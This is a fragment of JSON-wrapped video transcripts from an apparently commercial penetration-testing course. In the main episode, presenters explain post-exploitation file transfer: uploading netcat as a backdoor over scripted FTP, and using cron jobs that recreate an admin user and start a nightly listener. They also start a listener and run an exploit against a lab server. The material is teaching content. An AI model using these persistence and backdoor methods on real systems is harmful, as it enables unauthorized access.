server,\n\n596\n00:31:39.730 --> 00:31:41.990\nas well as get into their database-\n&gt;&gt; [LAUGH]\n\n597\n00:31:41.990 --> 00:31:42.800\n&gt;&gt; On the side, and\n\n598\n00:31:42.800 --> 00:31:45.600\nyou can't beat that, right?\n\n599\n00:31:45.600 --> 00:31:47.520\nThat's a two-fer, so we love it.\n\n600\n00:31:47.520 --> 00:31:50.570\nAll right, Danny, we thank you for\nthose demonstrations there, fantastic.\n\n601\n00:31:50.570 --> 00:31:53.580\nWe hope everybody out there\nenjoyed watching this one.\n\n602\n00:31:53.580 --> 00:31:56.540\nSigning off for ITProTV,\nI've been your host Mike Rodrick.\n\n603\n00:31:56.540 --> 00:31:57.350\n&gt;&gt; And I'm Daniel Lowrie.\n\n604\n00:31:57.350 --> 00:31:57.915\n&gt;&gt; And we'll see you next time.\n\n605\n00:31:57.915 --> 00:32:06.299\n[MUSIC]\n\n606\n00:32:06.299 --> 00:32:11.370\nThank you for watching ITPro.TV.\n\n",
          "vimeoId": "202379256"
        },
        {
          "description": "In this episode, Dan and Mike demonstrate how to transfer files to a compromised machine. They discuss several tools that can be used in Linux and Windows. They demonstrate transferring files using both FTP and TFTP.",
          "length": "1874",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-6-1-file_transfer_fun-020217-PGM.00_30_59_20.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-6-1-file_transfer_fun-020217-PGM.00_30_59_20.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-6-1-file_transfer_fun-020217-PGM.00_30_59_20.Still001-sm.jpg",
          "title": "File Transfer Fun",
          "transcript": "WEBVTT\n\n1\n00:00:00.000 --> 00:00:05.988\nWelcome to ITProTV,\nI'm your host [CROSSTALK].\n\n2\n00:00:05.988 --> 00:00:12.326\n[SOUND]\n&gt;&gt; You're watching ITProTV.\n\n3\n00:00:12.326 --> 00:00:14.684\n&gt;&gt; Hello.\nWelcome to another exciting episode here\n\n4\n00:00:14.684 --> 00:00:15.281\nat ITProTV.\n\n5\n00:00:15.281 --> 00:00:19.407\nI'm your host Mike Roderick and\ntoday we're doing penetration testing.\n\n6\n00:00:19.407 --> 00:00:24.354\nAnd in this episode we're gonna be\nlooking at File transfer fun, sounds fun.\n\n7\n00:00:24.354 --> 00:00:26.080\n&gt;&gt; [LAUGH]\n&gt;&gt; Let's see what Daniel has in\n\n8\n00:00:26.080 --> 00:00:26.710\nstore for us.\n\n9\n00:00:26.710 --> 00:00:27.750\nWelcome back Daniel.\n\n10\n00:00:27.750 --> 00:00:28.830\n&gt;&gt; So glad to be back, Mike.\n\n11\n00:00:28.830 --> 00:00:32.500\nYes, I know it's an odd title,\ncuz I'm an odd person so I like to\n\n12\n00:00:32.500 --> 00:00:36.320\nhave a little fun when I'm doing things\nand today is all about file transfer fun.\n\n13\n00:00:36.320 --> 00:00:40.420\nAnd it probably does seem a little bit\nambiguous as far as the title goes.\n\n14\n00:00:40.420 --> 00:00:44.790\nProbably not gleaning too much\nout of that as content, per se.\n\n15\n00:00:44.790 --> 00:00:47.860\nSo let me remove the veil so\nthat thought might see.\n\n16\n00:00:47.860 --> 00:00:48.450\n&gt;&gt; Drumroll.\n\n17\n00:00:48.450 --> 00:00:49.320\n&gt;&gt; Yeah, drumroll please.\n\n18\n00:00:49.320 --> 00:00:53.260\nWhat we're talking about here\nis being able to transfer files,\n\n19\n00:00:53.260 --> 00:00:54.295\nyou probably picked that up.\n\n20\n00:00:54.295 --> 00:00:55.040\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n21\n00:00:55.040 --> 00:00:59.100\nthe problem comes in is when you exploit\na machine, a lot of times you're working\n\n22\n00:00:59.100 --> 00:01:03.810\nwith that reverse shell or\na bind shell or something like that.\n\n23\n00:01:03.810 --> 00:01:08.550\nAnd since it's probably done\nsomething to trigger that to occur,\n\n24\n00:01:08.550 --> 00:01:10.550\nyou've exploited a buffer overflow.\n\n25\n00:01:10.550 --> 00:01:14.280\nOr there was a remote code\nexploitation you've found online and\n\n26\n00:01:14.280 --> 00:01:18.230\nyou compiled it and ran it against\nthat machine and it did these things.\n\n27\n00:01:18.230 --> 00:01:20.218\nWhatever it was, you get that shell back.\n\n28\n00:01:20.218 --> 00:01:26.805\nIt doesn't do really well\nwith like interactive things.\n\n29\n00:01:26.805 --> 00:01:30.670\nBut you will want to have file,\nyou will want to transfer files to it.\n\n30\n00:01:30.670 --> 00:01:32.550\nAnd we'll talk about that just for\na second.\n\n31\n00:01:32.550 --> 00:01:34.070\nSo that's what today is all about really.\n\n32\n00:01:34.070 --> 00:01:37.297\nActually, I guess we're gonna\ntalk about it now [LAUGH].\n\n33\n00:01:37.297 --> 00:01:40.352\n&gt;&gt; It could be a case where maybe that\nmachine you've compromised is your\n\n34\n00:01:40.352 --> 00:01:41.440\npivot point.\n\n35\n00:01:41.440 --> 00:01:44.735\nAnd from there, now that you're inside\nthat network, you'd like to do some\n\n36\n00:01:44.735 --> 00:01:47.750\ndeeper scans of stuff you couldn't\nget to when you were on the outside.\n\n37\n00:01:47.750 --> 00:01:50.620\nDoes that machine have a scanner on it?\n\n38\n00:01:50.620 --> 00:01:52.240\nDoes it have the tools you need?\n\n39\n00:01:52.240 --> 00:01:54.210\nSo when we say transferring files,\n\n40\n00:01:54.210 --> 00:01:57.410\nthey very well could be\nexecutables programs as well.\n\n41\n00:01:57.410 --> 00:01:59.590\n&gt;&gt; Yeah and Mike is actually right here.\n\n42\n00:01:59.590 --> 00:02:03.775\nWhen I say files I should have clarified\nI don't mean, here's my grocery list.\n\n43\n00:02:03.775 --> 00:02:05.380\n&gt;&gt; [LAUGH]\n&gt;&gt; Here's an Excel spreadsheet.\n\n44\n00:02:05.380 --> 00:02:07.840\n&gt;&gt; Or we could be exfiltrating data or\nsomething.\n\n45\n00:02:07.840 --> 00:02:09.710\n&gt;&gt; Yeah, you could be doing that.\n\n46\n00:02:09.710 --> 00:02:13.340\nBut, typically what I mean is that\nwe need to be able to transfer\n\n47\n00:02:13.340 --> 00:02:15.880\nthings that are gonna allow\nus to maintain access.\n\n48\n00:02:15.880 --> 00:02:18.840\nThey're going to allow us to use it\nlike Mike said as a pivot point for\n\n49\n00:02:18.840 --> 00:02:21.660\nfurther exploitation maybe\nit's a multi home machine.\n\n50\n00:02:21.660 --> 00:02:26.250\nAnd now I want to continue scanning\nmachines I didn't have access to before,\n\n51\n00:02:26.250 --> 00:02:29.200\nbut now that I've gained access\nto this machine, I can see them.\n\n52\n00:02:29.200 --> 00:02:33.930\nBut does it have Nmap installed,\nprobably not, maybe not, who knows?\n\n53\n00:02:33.930 --> 00:02:35.410\nRight?\nThat's the whole purpose.\n\n54\n00:02:35.410 --> 00:02:38.740\nIs it of machine you've exploited\ndoesn't have these things,\n\n55\n00:02:38.740 --> 00:02:44.260\nhow do we get our tools and\nthings that we would normally use?\n\n56\n00:02:44.260 --> 00:02:49.010\nAs a pen tester or a hacker to continue\nand further down the rabbit hole.\n\n57\n00:02:49.010 --> 00:02:51.560\nHow do we get that from our\nmachine into their machine?\n\n58\n00:02:51.560 --> 00:02:52.950\nSo that's what today is about.\n\n59\n00:02:52.950 --> 00:02:54.260\nA couple of ways in which we can do that.\n\n60\n00:02:54.260 --> 00:02:57.980\nThere's actually like a bunch of different\nways that this could possibly be done.\n\n61\n00:02:57.980 --> 00:03:02.760\nI'm gonna show you some manual\nways just in case you just get\n\n62\n00:03:02.760 --> 00:03:05.769\nthe turd of the ball that\nhas nothing on there.\n\n63\n00:03:05.769 --> 00:03:06.730\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n64\n00:03:06.730 --> 00:03:10.560\nmaybe some basic file transfer protocols.\n\n65\n00:03:10.560 --> 00:03:12.050\nAnd that's what we're gonna use.\n\n66\n00:03:12.050 --> 00:03:12.830\nWe're gonna use FTP.\n\n67\n00:03:12.830 --> 00:03:17.580\nBecause typically FTP is found\non just about everything.\n\n68\n00:03:17.580 --> 00:03:19.380\nSo we'll show you how to do that.\n\n69\n00:03:19.380 --> 00:03:22.340\nWell also I want you guess in it\nbefore we continue on further.\n\n70\n00:03:23.670 --> 00:03:27.510\nAnother reason that we might wanna\nwatch this I said maintaining access.\n\n71\n00:03:27.510 --> 00:03:29.530\nYou may wanna upload\nthe back door to this thing.\n\n72\n00:03:29.530 --> 00:03:32.830\nMaybe a nice file so you don't have\nto keep reinventing the wheel.\n\n73\n00:03:32.830 --> 00:03:37.275\nYou've created the batch file or something\nif the windows machine or Cron job,\n\n74\n00:03:37.275 --> 00:03:41.540\nif it's a Linux machine that automatically\nchecks to see if a user is there.\n\n75\n00:03:41.540 --> 00:03:45.050\nAnd if not,\ncreate that user put said password and\n\n76\n00:03:45.050 --> 00:03:49.830\nstart a netcat listener at 12:00 every\nnight if that's not already happening.\n\n77\n00:03:49.830 --> 00:03:53.890\nThings of that nature that I have to\nkeep access, because what happens?\n\n78\n00:03:53.890 --> 00:03:57.352\nYou think well I can use my exploit and\nget in this box whenever I want.\n\n79\n00:03:57.352 --> 00:03:59.600\nWell, maybe.\n\n80\n00:03:59.600 --> 00:04:00.180\nWhat happens?\n\n81\n00:04:00.180 --> 00:04:02.790\nMike, you've worked in\nsystems administration,\n\n82\n00:04:02.790 --> 00:04:04.580\nI've worked in systems administration.\n\n83\n00:04:04.580 --> 00:04:08.640\nI don't know about you, but I get little\nemails from time to time who say, hey,\n\n84\n00:04:08.640 --> 00:04:09.560\nthere's an update ready.\n\n85\n00:04:09.560 --> 00:04:12.540\n&gt;&gt; Yeah, there's something going on here,\nor there's an update.\n\n86\n00:04:12.540 --> 00:04:15.440\nAnd maybe the reason you're able to\ncompromise that machine because as\n\n87\n00:04:15.440 --> 00:04:18.160\nan admin I was a little slow\nin doing those updates.\n\n88\n00:04:18.160 --> 00:04:21.510\nSo you come back a few days later\nexpecting that exploit that worked\n\n89\n00:04:21.510 --> 00:04:24.520\nbeautifully, you spent all that time\ndoing to get you right back in and\n\n90\n00:04:24.520 --> 00:04:26.130\nall of a sudden it doesn't work.\n\n91\n00:04:26.130 --> 00:04:27.240\nAnd now you're banging your head\n\n92\n00:04:27.240 --> 00:04:29.060\nwishing you would have had\nthat back door in place.\n\n93\n00:04:29.060 --> 00:04:30.020\n&gt;&gt; That's exactly right.\n\n94\n00:04:30.020 --> 00:04:34.050\nSo systems get patched,\nthey get updated and exploits go away.\n\n95\n00:04:34.050 --> 00:04:37.810\nSo the exploit that got you in yesterday\nis not necessarily gonna get you in\n\n96\n00:04:37.810 --> 00:04:41.680\ntomorrow, because that river changes,\nso be prepared for that.\n\n97\n00:04:41.680 --> 00:04:44.140\nWe have to keep that in mind.\n\n98\n00:04:44.140 --> 00:04:48.540\nWe want to be able to maintain our access\neven if the system does get patched.\n\n99\n00:04:48.540 --> 00:04:53.500\nSo that's basically why we want to be\nable to transfer our files and tools and\n\n100\n00:04:53.500 --> 00:04:57.060\nthings, upload them to\nour exploited systems.\n\n101\n00:04:57.060 --> 00:05:00.310\nNow let's talk about Linux really quickly.\n\n102\n00:05:00.310 --> 00:05:04.080\nLinux, the Linux system god bless them.\n\n103\n00:05:04.080 --> 00:05:05.710\nThey give you just about\neverything under the sun.\n\n104\n00:05:05.710 --> 00:05:10.670\nLinux love to have tools available for\nyou for doing things from a command line.\n\n105\n00:05:10.670 --> 00:05:13.180\n&gt;&gt; What does a hacker do\nif he breaks into a box and\n\n106\n00:05:13.180 --> 00:05:15.352\nthe box is running on Kali Linux.\n\n107\n00:05:15.352 --> 00:05:17.480\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH]\n\n108\n00:05:17.480 --> 00:05:18.447\n&gt;&gt; I bet they laugh.\n\n109\n00:05:18.447 --> 00:05:19.750\n&gt;&gt; [LAUGH]\n&gt;&gt; If I were me and\n\n110\n00:05:19.750 --> 00:05:21.840\nif I broke into a box and\nit was a Kali Linux machine.\n\n111\n00:05:21.840 --> 00:05:24.048\n&gt;&gt; Right.\n&gt;&gt; I'd be like, wow.\n\n112\n00:05:24.048 --> 00:05:26.649\n&gt;&gt; Thank you for setting up my\nattack machines for me, I guess.\n\n113\n00:05:26.649 --> 00:05:27.536\nI don't know.\n&gt;&gt; Yeah, just fine.\n\n114\n00:05:27.536 --> 00:05:28.483\nYou're going to jail.\n\n115\n00:05:28.483 --> 00:05:30.440\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n116\n00:05:30.440 --> 00:05:31.180\n&gt;&gt; Cuz it ain't gonna me\n\n117\n00:05:31.180 --> 00:05:33.490\nbe they come looking for,\nit's gonna be you.\n\n118\n00:05:33.490 --> 00:05:34.360\nNo, we don't do that.\n\n119\n00:05:34.360 --> 00:05:38.165\nRemember, this is our time of day where we\ntell everyone we do not break into other\n\n120\n00:05:38.165 --> 00:05:41.220\npeople's' machines just because\nit's fun or profitable.\n\n121\n00:05:41.220 --> 00:05:44.800\nWe break into other people's machines\nbecause they've given us authorized access\n\n122\n00:05:44.800 --> 00:05:49.600\nto do so for the purposes of penetration\ntesting, or they are our machines.\n\n123\n00:05:49.600 --> 00:05:51.490\nWe own them,\nwe can do whatever we feel like to them.\n\n124\n00:05:51.490 --> 00:05:55.860\nIf you just want to delete the C drive or\nwhatever, because it's yours\n\n125\n00:05:55.860 --> 00:06:00.410\ngo right ahead feel free and blast\nthose things with every nuke you have.\n\n126\n00:06:00.410 --> 00:06:01.452\n&gt;&gt; Absolutely.\n\n127\n00:06:01.452 --> 00:06:02.120\nAll right so Daniel,\n\n128\n00:06:02.120 --> 00:06:06.360\nwhat kind of things are we looking at if\nwe want to get these files to our target?\n\n129\n00:06:06.360 --> 00:06:08.190\nAre there any specific things\nwe could use to do that?\n\n130\n00:06:08.190 --> 00:06:09.840\nI know you mentioned FTP.\n\n131\n00:06:09.840 --> 00:06:11.680\n&gt;&gt; Yeah, FTP is a great thing because FTP,\n\n132\n00:06:11.680 --> 00:06:15.300\nlike I said is typically already\ninstalled on the machine.\n\n133\n00:06:15.300 --> 00:06:16.480\nAlmost every,\n\n134\n00:06:16.480 --> 00:06:21.750\nI don't know of an OS that does not\ncome preinstalled with an FTP client.\n\n135\n00:06:21.750 --> 00:06:22.767\nSo FTP is a great thing.\n\n136\n00:06:22.767 --> 00:06:25.454\nYou can almost guarantee.\n\n137\n00:06:25.454 --> 00:06:27.350\nRely that it will be there.\n\n138\n00:06:27.350 --> 00:06:31.670\nSo being able to use\nFTP is gonna be great.\n\n139\n00:06:31.670 --> 00:06:33.020\nAnother one is TFTP.\n\n140\n00:06:33.020 --> 00:06:36.150\nTFTP is great, it's quick, it's easy.\n\n141\n00:06:36.150 --> 00:06:39.920\nThe problem is, is that it's really hit or\nmiss whether or\n\n142\n00:06:39.920 --> 00:06:42.500\nnot it will be available for you.\n\n143\n00:06:42.500 --> 00:06:46.260\nI'll try to show the TFTP I didn't really\nset up a demo we'll just wing it and\n\n144\n00:06:46.260 --> 00:06:47.350\nsee if it works.\n\n145\n00:06:47.350 --> 00:06:49.750\nBut we're going to start\ndefinitely with FTP cuz FTP,\n\n146\n00:06:49.750 --> 00:06:52.960\nI want you to be able\nto know how to do this.\n\n147\n00:06:52.960 --> 00:06:55.810\nSo if we're talking\nabout a Window's system,\n\n148\n00:06:55.810 --> 00:06:58.530\nlet's just get some\nparticulars out of the way.\n\n149\n00:06:58.530 --> 00:07:01.270\nUsually already on XP, Windows 2003, so\n\n150\n00:07:01.270 --> 00:07:05.580\nif you're working with some older type\nof machines is probably already there.\n\n151\n00:07:05.580 --> 00:07:09.480\nIf you're talking Windows 7,\n2008 server, up and above.\n\n152\n00:07:09.480 --> 00:07:12.140\nIt might not be there,\nyou might have to install it.\n\n153\n00:07:12.140 --> 00:07:14.680\n&gt;&gt; That's the TFTP trivial\nfile transfer protocol.\n\n154\n00:07:14.680 --> 00:07:16.340\n&gt;&gt; Right, right.\n\n155\n00:07:16.340 --> 00:07:17.200\nEven FTP.\n\n156\n00:07:17.200 --> 00:07:18.300\n&gt;&gt; Okay.\n&gt;&gt; Even FTP.\n\n157\n00:07:18.300 --> 00:07:22.610\nSo they started like, it's there which you\nhave to kinda like enable it kinda thing.\n\n158\n00:07:22.610 --> 00:07:23.390\nSo.\n\n159\n00:07:23.390 --> 00:07:28.250\nYeah there you go whereas\nTFTP not installed on newer\n\n160\n00:07:28.250 --> 00:07:31.180\nWindows machines at least if\nI'm remembering correctly.\n\n161\n00:07:31.180 --> 00:07:32.570\n&gt;&gt; And what about Linux?\n\n162\n00:07:32.570 --> 00:07:34.170\n&gt;&gt; Linux always almost guaranteed.\n\n163\n00:07:34.170 --> 00:07:36.240\nIt's FTP client is there.\n\n164\n00:07:37.780 --> 00:07:40.140\nEven netcat a lot of times\ncomes pre-installed.\n\n165\n00:07:40.140 --> 00:07:46.505\nWget which is an internet or\na network get trials work.\n\n166\n00:07:46.505 --> 00:07:50.905\nWe were basically saying give me web pages\nor if there's file to download I can use\n\n167\n00:07:50.905 --> 00:07:54.810\nWget to download them from a web source or\na network source.\n\n168\n00:07:54.810 --> 00:07:58.823\nThere's also curl which will\ndo the same thing basically.\n\n169\n00:07:58.823 --> 00:08:01.300\nAnd they're usually installed\non your Linux system.\n\n170\n00:08:01.300 --> 00:08:05.650\nSo Linux is It's usually not that\ndifficult to use as a pivot point,\n\n171\n00:08:05.650 --> 00:08:09.120\nbecause it has a lot of stuff prebuilt,\nprebaked in.\n\n172\n00:08:09.120 --> 00:08:14.210\nWhere as Windows,\nyou're probably gonna be left with FTP.\n\n173\n00:08:14.210 --> 00:08:17.380\nSo that's where we're gonna\nspend some time today.\n\n174\n00:08:17.380 --> 00:08:20.930\nI did mention interactive versus non\ninteractive, let me just reiterate that.\n\n175\n00:08:22.150 --> 00:08:25.616\nSo, the FTP client is\nan interactive client.\n\n176\n00:08:25.616 --> 00:08:29.480\nIf you type in FTP and you hit Enter,\nit drops you to an FTP prompt.\n\n177\n00:08:29.480 --> 00:08:34.230\nWhere you can type an FTP commands like\nOpen and Get and Bend and all the other\n\n178\n00:08:34.230 --> 00:08:38.010\nthings that are available for\nyou to be able to log in to FTP servers.\n\n179\n00:08:38.010 --> 00:08:41.520\nAnd once you log in, you have another set\nof commands for transferring files and\n\n180\n00:08:41.520 --> 00:08:45.340\nputting files and\nworking with the directory search.\n\n181\n00:08:45.340 --> 00:08:46.040\nAll that good in nature.\n\n182\n00:08:46.040 --> 00:08:48.570\nBut that's an interactive system.\n\n183\n00:08:48.570 --> 00:08:53.060\nIt drops you out of\nthe shell into an FTP shell.\n\n184\n00:08:53.060 --> 00:08:58.308\nAnd again, because we are logged\nin a variously to put in bluntly,\n\n185\n00:08:58.308 --> 00:09:02.642\nthat tends to give I think\nthe technical word is hinky.\n\n186\n00:09:02.642 --> 00:09:03.940\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n187\n00:09:03.940 --> 00:09:05.380\n&gt;&gt; It doesn't work well.\n\n188\n00:09:05.380 --> 00:09:09.810\nIt goes haywire,\nyou don't see the output you wanna see.\n\n189\n00:09:09.810 --> 00:09:11.420\nMaybe the commands are being inputted.\n\n190\n00:09:11.420 --> 00:09:12.780\nYou don't know, things get weird.\n\n191\n00:09:12.780 --> 00:09:14.610\nAnd it's just really\ndifficult to work with.\n\n192\n00:09:14.610 --> 00:09:18.106\n&gt;&gt; Yeah, we saw that the other day I think\nin one of those episodes where you had\n\n193\n00:09:18.106 --> 00:09:19.450\ngotten your reverse shell.\n\n194\n00:09:19.450 --> 00:09:22.565\nI think did an outlet where\nwe see nothing in the prompt,\n\n195\n00:09:22.565 --> 00:09:25.826\nhit Enter a couple times and\nboom, there was everything.\n\n196\n00:09:25.826 --> 00:09:29.018\nIt was just again, having trouble\nsending it back to the console because\n\n197\n00:09:29.018 --> 00:09:31.730\nthe console's not where it should be,\nit's remote yeah.\n\n198\n00:09:31.730 --> 00:09:32.240\n&gt;&gt; Right.\nYeah.\n\n199\n00:09:32.240 --> 00:09:33.799\nRight, yeah.\nSo we wanna avoid that,\n\n200\n00:09:33.799 --> 00:09:35.527\nwe just wanna make our lives easy.\n\n201\n00:09:35.527 --> 00:09:39.421\nAnd the way we can do this by just\nwriting a script that will do it for us.\n\n202\n00:09:39.421 --> 00:09:43.885\nAnd the cool thing about FTP is\nthat on the Windows machine,\n\n203\n00:09:43.885 --> 00:09:46.753\nfunny enough, not the Linux client.\n\n204\n00:09:46.753 --> 00:09:50.800\nAt least not the FTP client on my Linux\nsystem, it does not support this feature.\n\n205\n00:09:50.800 --> 00:09:53.870\nWe have to actually write a bash script,\nwhich we'll do.\n\n206\n00:09:53.870 --> 00:09:58.510\nBut in Windows, the FTP client there\nsupports reading input from a file.\n\n207\n00:09:59.540 --> 00:10:03.900\nSo this helps us out because of\nthat whole interactive process,\n\n208\n00:10:03.900 --> 00:10:05.800\nnow I can run on this non interactive.\n\n209\n00:10:05.800 --> 00:10:10.690\nJust feed it a line which reads from\na file with a bunch of commands.\n\n210\n00:10:10.690 --> 00:10:14.690\nAnd then everything's done, I don't\nhave to interactively work with it.\n\n211\n00:10:14.690 --> 00:10:16.440\nIt just says, here's my instructions set.\n\n212\n00:10:16.440 --> 00:10:18.620\nLet me do that when I'm done, exit out.\n\n213\n00:10:18.620 --> 00:10:20.710\nAnd I'm done you're not\nworking interactively with it.\n\n214\n00:10:20.710 --> 00:10:22.800\nSo therefore you don't\nhave to worry about it.\n\n215\n00:10:22.800 --> 00:10:27.640\nMessing around with your weird\nshell that you've spawned out.\n\n216\n00:10:27.640 --> 00:10:30.850\nSo what do we need for the pre-set up?\n\n217\n00:10:30.850 --> 00:10:35.090\nWe need to install and\nstart a local FTP server on the attacker\n\n218\n00:10:35.090 --> 00:10:37.765\nPC because I'm gonna be\nuploading files via FTP.\n\n219\n00:10:37.765 --> 00:10:41.130\nSo a good idea for\nyou to be running an FTP server.\n\n220\n00:10:41.130 --> 00:10:45.900\nI'm running VSFTP on my machine,\nthere are others as well.\n\n221\n00:10:45.900 --> 00:10:46.720\nWhatever you like.\n\n222\n00:10:46.720 --> 00:10:48.090\nIf it works for you, that's great.\n\n223\n00:10:48.090 --> 00:10:50.120\nGo go out and\ngrab your favorite FTP server.\n\n224\n00:10:50.120 --> 00:10:54.660\nIf it's already installed fire it up\nget your files put them in the FTP\n\n225\n00:10:54.660 --> 00:10:55.530\nroot directory so\n\n226\n00:10:55.530 --> 00:10:59.020\nthat when someone logs into FTP those\nare the files that will be available.\n\n227\n00:10:59.020 --> 00:11:01.910\nYou'll probably want\nto create an FTP user.\n\n228\n00:11:01.910 --> 00:11:05.310\nYou don't want just typically\nanonymous FTP login is\n\n229\n00:11:05.310 --> 00:11:07.950\nnot the most secure thing on Earth.\n\n230\n00:11:07.950 --> 00:11:12.300\nSo just create a user for that account so\nthat you can use that for these purposes.\n\n231\n00:11:13.420 --> 00:11:14.486\nAnd then copy.\n\n232\n00:11:14.486 --> 00:11:16.737\nYour exploitation tools,\nyour back doors, your cron jobs,\n\n233\n00:11:16.737 --> 00:11:17.963\nwhatever it is you've created.\n\n234\n00:11:17.963 --> 00:11:23.525\nAnd slam it into that directory so\nthat that user can download those tools.\n\n235\n00:11:23.525 --> 00:11:28.480\nSo that is our basic setup for\nattacking machine.\n\n236\n00:11:28.480 --> 00:11:35.052\nThen all we have to do is log in through\nan exploit to an exploit machine.\n\n237\n00:11:35.052 --> 00:11:37.542\nFor this testing purposes, for\nthe demonstration purposes,\n\n238\n00:11:37.542 --> 00:11:40.792\nI'm just going to use our buffer\nexploit on our Windows machine.\n\n239\n00:11:40.792 --> 00:11:43.490\nBecause it's the only machine\nI have access to that we can\n\n240\n00:11:43.490 --> 00:11:45.830\nactually play with and\ndestroy if necessary.\n\n241\n00:11:45.830 --> 00:11:47.010\nSo that's what I'm gonna do.\n\n242\n00:11:47.010 --> 00:11:50.240\nI think I already have that fired up.\n\n243\n00:11:50.240 --> 00:11:53.840\nYeah, there's the vuln server listener.\n\n244\n00:11:53.840 --> 00:11:57.350\nJust awaiting for connections there.\n\n245\n00:11:57.350 --> 00:12:01.467\nSo I will,\nI guess I'll fire up the listener here.\n\n246\n00:12:01.467 --> 00:12:05.366\nN seed,\nnvlp I don't even remember my commands\n\n247\n00:12:05.366 --> 00:12:08.489\nI'm blanking out there for a second.\n\n248\n00:12:08.489 --> 00:12:10.703\n&gt;&gt; [LAUGH].\n&gt;&gt; 5555 let's fire that up and\n\n249\n00:12:10.703 --> 00:12:13.690\nthen I'll come over here and\nfire off our exploit.\n\n250\n00:12:13.690 --> 00:12:16.116\nGood old sploit.\n\n251\n00:12:16.116 --> 00:12:19.028\n.py, there we go.\n\n252\n00:12:19.028 --> 00:12:22.550\nAnd you can see my prompt has come back.\n\n253\n00:12:22.550 --> 00:12:23.610\nI'm logged in.\n\n254\n00:12:23.610 --> 00:12:26.350\nI've already created\na nefarious user on this and\n\n255\n00:12:26.350 --> 00:12:29.070\nthen added him to\nthe local administrators.\n\n256\n00:12:29.070 --> 00:12:30.590\nBut again, that might go away, right?\n\n257\n00:12:30.590 --> 00:12:32.010\nSomebody might, what is this?\n\n258\n00:12:32.010 --> 00:12:33.170\nWe've been hacked!\n\n259\n00:12:33.170 --> 00:12:35.300\nAnd then, we need to patch our systems,\nda, da, da.\n\n260\n00:12:35.300 --> 00:12:38.500\nThe whole nine and take measures, so\n\n261\n00:12:38.500 --> 00:12:43.730\nI can't count on this remaining there\nwith any kind of level of confidence.\n\n262\n00:12:43.730 --> 00:12:44.362\nSo that's what we're gonna do.\n\n263\n00:12:44.362 --> 00:12:45.247\nAnd all I'm gonna do,\n\n264\n00:12:45.247 --> 00:12:48.330\njust for demonstration purposes yet\nagain, my backdoor's gonna be netcat.\n\n265\n00:12:48.330 --> 00:12:52.800\nCuz typically netcat not found\non a Windows installation.\n\n266\n00:12:52.800 --> 00:12:57.830\nSo then if I do a dir, you can see I'm\nin this directory, netcat's not there.\n\n267\n00:12:57.830 --> 00:13:01.802\nNetcat is actually on this machine because\nit's my test machine so it is there, but\n\n268\n00:13:01.802 --> 00:13:04.029\nwe're going to pretend\nthat's not the case.\n\n269\n00:13:04.029 --> 00:13:06.591\nThis is just your run of\nthe mill server out in the wild.\n\n270\n00:13:06.591 --> 00:13:10.306\nIt was running a vulnerable service\nwe exploited it and got a shell,\n\n271\n00:13:10.306 --> 00:13:13.310\nwe created a user and\nnow we've set the stage.\n\n272\n00:13:13.310 --> 00:13:17.600\nNetcat is not here, we want to upload\nnetcat so we can use netcat for\n\n273\n00:13:17.600 --> 00:13:18.780\nour reasons later.\n\n274\n00:13:18.780 --> 00:13:20.590\nCreate maybe reverse shell,\nbind shell, whatever.\n\n275\n00:13:22.160 --> 00:13:25.243\nSo what are we gonna do to do that?\n\n276\n00:13:25.243 --> 00:13:26.828\nWell, we're going to create that file.\n\n277\n00:13:26.828 --> 00:13:31.480\nLet me show you,\nif I do ftp-- help, like so.\n\n278\n00:13:31.480 --> 00:13:35.983\nYou'll see you get all these cool\noptions for your FTP [INAUDIBLE],\n\n279\n00:13:35.983 --> 00:13:40.430\njust typing your FTP is not the extent\nof it you need a little more.\n\n280\n00:13:40.430 --> 00:13:44.490\nOptions we're gonna need is -v,\nright here.\n\n281\n00:13:44.490 --> 00:13:47.550\nSuppresses display of\nremote server responses.\n\n282\n00:13:47.550 --> 00:13:51.310\nWhich is weird to me because\ntypically -v is for verbosity.\n\n283\n00:13:51.310 --> 00:13:54.680\nShow me the things that\nthe server is saying.\n\n284\n00:13:54.680 --> 00:13:57.450\nBut for here they've used -v,\nit suppresses them.\n\n285\n00:13:57.450 --> 00:13:59.458\nGo figure on that one,\nI just thought that was interesting.\n\n286\n00:13:59.458 --> 00:14:04.520\n-n, suppress auto-Login\nupon initial connection.\n\n287\n00:14:04.520 --> 00:14:05.800\nVery important.\n\n288\n00:14:05.800 --> 00:14:06.610\nWe will need that.\n\n289\n00:14:06.610 --> 00:14:09.250\nWe don't want it trying\nto login as hacker,\n\n290\n00:14:09.250 --> 00:14:13.770\nbecause hacker is not a legitimate\nuser on my FTP service.\n\n291\n00:14:13.770 --> 00:14:16.270\nSo I don't want it to\ntry to login as hacker.\n\n292\n00:14:16.270 --> 00:14:19.760\nI want it to take a prompt for a user.\n\n293\n00:14:19.760 --> 00:14:21.480\nAnd we feed it what user I want it to use.\n\n294\n00:14:22.740 --> 00:14:27.680\nAnd then the third option we will\nuse here is this -s file name.\n\n295\n00:14:27.680 --> 00:14:30.440\nAnd this is the best part right here.\n\n296\n00:14:30.440 --> 00:14:33.940\nSpecifies a text file\ncontaining FTP commands.\n\n297\n00:14:33.940 --> 00:14:36.280\nThe commands will automatically\nrun after FTP starts.\n\n298\n00:14:36.280 --> 00:14:38.470\nWell isn't that just a dandy little thing?\n\n299\n00:14:38.470 --> 00:14:42.310\nThank you FTP client,\nwe will use that to our advantage.\n\n300\n00:14:42.310 --> 00:14:43.450\nAll right, so that being said.\n\n301\n00:14:44.840 --> 00:14:45.820\nLet's start this gig.\n\n302\n00:14:45.820 --> 00:14:49.510\nThere's a cool little thing that's\nfound on most OSs called Echo.\n\n303\n00:14:49.510 --> 00:14:54.000\nIf you say Echo hello it'll just\nprint hello to the output screen.\n\n304\n00:14:54.000 --> 00:14:58.400\nBut we can also redirect that\noutput into the input of a file.\n\n305\n00:14:59.790 --> 00:15:04.140\nAnd since FTP allows me\nto use a file as input\n\n306\n00:15:04.140 --> 00:15:06.060\nyou probably are catching my drift here.\n\n307\n00:15:06.060 --> 00:15:07.394\nYou're seeing where we're going with it.\n\n308\n00:15:07.394 --> 